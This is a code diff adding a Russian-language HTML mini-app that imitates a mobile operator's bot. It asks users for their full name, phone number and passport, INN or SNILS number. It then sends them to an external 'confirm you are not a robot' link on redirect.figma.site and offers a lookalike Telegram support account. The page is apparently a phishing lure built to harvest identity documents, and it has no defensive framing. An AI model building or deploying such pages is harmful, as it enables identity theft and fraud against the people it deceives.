@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>МКС Мини-Приложение</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      max-width: 420px;
+      margin: 20px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      padding: 20px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+      color: #0077cc;
+    }
+    button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      background: #0077cc;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #005fa3;
+    }
+    .hidden { display: none; }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+    }
+    .back {
+      background: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>МКС-Бот 💧</h1>
+
+    <!-- Главное меню -->
+    <div id="mainMenu">
+      <button onclick="showForm()">📝 Обновить данные</button>
+      <button>🔄 Поменять тариф</button>
+      <button>💳 Проверить баланс</button>
+      <button>💸 Пополнить баланс</button>
+      <button onclick="showExtra()">🛠️ Дополнительные услуги</button>
+    </div>
+
+    <!-- Форма -->
+    <div id="form" class="hidden">
+      <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+      <input id="fullname" placeholder="Фамилия Имя Отчество">
+      <input id="phone" placeholder="+79991234567">
+      <select id="doctype">
+        <option value="">Выберите документ</option>
+        <option>Паспорт</option>
+        <option>ИНН</option>
+        <option>СНИЛС</option>
+      </select>
+      <input id="docnum" placeholder="Серия и номер документа">
+      <button onclick="submitForm()">✅ Подтвердить</button>
+      <button class="back" onclick="goBack()">↩️ Вернуться назад</button>
+    </div>
+
+    <!-- Доп. услуги -->
+    <div id="extra" class="hidden">
+      <button>❓ Часто задаваемые вопросы</button>
+      <button>ℹ️ Инструкция</button>
+      <button onclick="window.open('https://t.me/MymtcSup','_blank')">📞 Связаться с техподдержкой</button>
+      <button class="back" onclick="goBack()">↩️ Вернуться назад</button>
+    </div>
+
+    <!-- Завершение -->
+    <div id="finish" class="hidden">
+      <p>Для завершения подтвердите, что вы не робот:</p>
+      <button onclick="window.open('https://redirect.figma.site/','_blank')">✅ Подтвердить, что не робот</button>
+      <button class="back" onclick="goBack()">🏠 В меню</button>
+    </div>
+  </div>
+
+  <script>
+    function showForm() {
+      document.getElementById("mainMenu").classList.add("hidden");
+      document.getElementById("form").classList.remove("hidden");
+    }
+    function showExtra() {
+      document.getElementById("mainMenu").classList.add("hidden");
+      document.getElementById("extra").classList.remove("hidden");
+    }
+    function goBack() {
+      document.querySelectorAll(".container > div").forEach(el => el.classList.add("hidden"));
+      document.getElementById("mainMenu").classList.remove("hidden");
+    }
+    function submitForm() {
+      // здесь можно отправить данные в Telegram WebApp или на сервер
+      const fullname = document.getElementById("fullname").value;
+      const phone = document.getElementById("phone").value;
+      const doctype = document.getElementById("doctype").value;
+      const docnum = document.getElementById("docnum").value;
+
+      if (!fullname || !phone || !doctype || !docnum) {
+        alert("⚠️ Заполните все поля!");
+        return;
+      }
+      document.querySelectorAll(".container > div").forEach(el => el.classList.add("hidden"));
+      document.getElementById("finish").classList.remove("hidden");
+    }
+  </script>
+</body>
+</html>
